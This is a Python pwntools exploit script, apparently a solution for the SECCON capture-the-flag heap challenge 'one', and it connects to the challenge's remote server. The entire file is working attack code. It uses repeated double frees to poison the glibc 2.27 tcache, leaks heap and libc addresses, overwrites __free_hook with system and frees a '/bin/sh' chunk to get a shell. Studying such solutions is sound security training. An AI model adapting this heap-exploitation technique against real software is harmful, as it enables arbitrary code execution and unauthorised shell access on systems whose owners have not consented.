from pwn import *
import re

# p = process('./one')
libc = ELF('./libc-2.27.so')
p = remote('one.chal.seccon.jp', 18357)

def add(s):
    p.sendline('1')
    p.recvuntil('>')
    p.sendline(s)
    p.recvuntil('>')

def show():
    p.sendlineafter('> ', '2')

def delete():
    p.sendline('3')
    p.recvuntil('>')
    # print p.recvuntil('>')

# gdb.attach(p)

add('A'*0x3e)
delete()
delete()
delete()
delete() # count = 4
show()
raw_input('stop')
heap_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
print "heap addr: " + hex(heap_addr)
add(p64(0) + 'A'*8) # use normal address for next chunk, count=3
pause()
add('A'*8) # this writes to previous chunk location but next chunk is now normal address, count=2

add((p64(heap_addr) + p64(0x91)) * 3) # tcache empty, new chunks created
add((p64(heap_addr) + p64(0x91)) * 3)
add((p64(heap_addr) + p64(0x91)) * 3)
add((p64(heap_addr) + p64(0x91)) * 3)
pause()

delete()
delete() # loop; chunk1 -> chunk1 -> chunk1 -> ... #count=4

add(p64(heap_addr+0x60)) # tcache poison moves next chunk for chunk1 to different location <new_chunk>, no loop
add('A'*8) # this removes 2nd chunk1 from freelist, next chunk is <new_chunk>
add('A'*8) # this is new_chunk
#count = 1

delete()
delete()
delete()
delete()
delete()
delete()
delete() # count = 7 for 0x80 bin
delete() #unsorted bin

pause()

show()
main_arena_96 = u64(p.recvline().strip('\n').ljust(8, '\x00'))
print hex(main_arena_96)
pause()
libc.address = main_arena_96 - 0x3ebca0

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']
add('A'*8) # remove once from freelist to get the correct tcache bin count=0

delete()
delete() # loop

add(p64(free_hook)) # HEAD (this) <- free_hook
add(p64(0)) # HEAD (free_hook) <- new chunk

add(p64(system)) # free_hook chunk has system address written in

add('/bin/sh\x00') # /bin/sh written to new chunk
delete() # free called on address @ new_chunk
p.interactive()
# free_hook calls system(new_chunk address) which results in system('/bin/sh')
